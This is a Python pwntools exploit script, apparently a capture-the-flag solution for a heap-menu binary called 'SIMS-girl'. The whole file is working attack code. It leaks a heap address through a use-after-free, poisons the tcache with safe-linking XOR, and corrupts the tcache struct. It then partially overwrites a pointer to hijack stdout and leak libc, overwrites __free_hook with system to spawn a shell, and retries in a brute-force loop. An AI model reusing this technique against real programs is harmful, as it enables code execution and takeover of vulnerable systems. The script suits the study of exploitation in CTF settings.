# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './SIMS-girl'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 1
if DEBUG:
    libc = elf.libc
    context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
uu64= lambda a          : u64(p.recv(a).ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def getShell():
    sl('exec 1>&0')
    sl('echo shell')
    ru('shell')
    p.success('Get Shell')
    sl('cat flag')
    ru('flag')
    flag = rl()
    return ('flag' + flag)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('Choice:',num)

def work(num):
    cmd(1)
    sla('Choice:',num)

def improving(num):
    cmd(2)
    sla('Choice:',num)

def add(size,name,data):
    cmd(3)
    sla('Choice:',3)
    sla('partner:',size)
    sla('nickname:',name)
    sa('greeting:',data)

def lessM():
    cmd(3)
    sla('Choice:',2)

def buy(num):
    cmd(5)
    sla('Choice:',num)

def delete(idx):
    cmd(4)
    sla('visit:',idx)
    sla('Choice:',3)

def marry(idx):
    cmd(6)
    sla('marry?',idx)
    ru('to you: ')
    heap_base = u64(p.recv(5).ljust(8,'\x00')) << 12
    sla('groom: ','a')
    sla('nickname: ','a')
    return heap_base

def edit(idx,data):
    cmd(999)
    sla('friends:',idx)
    sla('heart:',data)

# one_gad = one_gadget(libc.path)

def attack():
    
    sla('Name:','Niyah')
    sla('Age:',18)
    sla('Sex (1:man,2: woman): ' , 2)
    for i in range(5):
        lessM()
    for i in range(0x10):
        improving(3)
    buy(1)
    buy(2)
    
    add(0x208 , 'a','b\n') #0
    add(0x208 , 'a','b\n') #1
    add(0x28 , 'a','b\n') #2

    delete(0)
    heap_base = marry(0)
    
    # lg('heap_base',heap_base)
    delete(1)
    edit(1 , p64((heap_base >> 12)^ (heap_base + 0x10)))
    add(0x208 , 'a','b\n') #3
    fake_tch = flat(
        '\x00\x00'*0x10 , '\x07\x00'*0x30
    )
    add(0x208 , 'a',fake_tch + '\n') #4
    delete(4)
    add(0x88 , 'a' , '\x00\x00' + '\x07\x00'*15 + '\n') #5
    add(0x2 , 'a' , p16(0xd6c0)) #6
    delete(2)
    fake_io = flat(
        0xfbad1800, 0,
        0,0,
    ) 

    add(0x98 , 'a' , fake_io + '\n') #7
    leak = l64()
    if(leak ==0 ):
        exit(0)
    lg('leak',leak)

    libc.address = leak - 0x1e1744
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']
    binsh_addr = libc.search('/bin/sh').next()

    # dbg()
    add(0x18 , 'a' , p64(__free_hook)*3 + '\n') #8
    delete(6)
    add(0xf8 , '/bin/sh\x00' , p64(system_addr) + '\n') #9
    delete(9)
    # dbg()

    # p.success(getShell())
    p.interactive()

# attack()
exhaust(attack)

'''
@File    :   SIMS-girl.py
@Time    :   2021/11/27 18:03:18
@Author  :   Niyah 
'''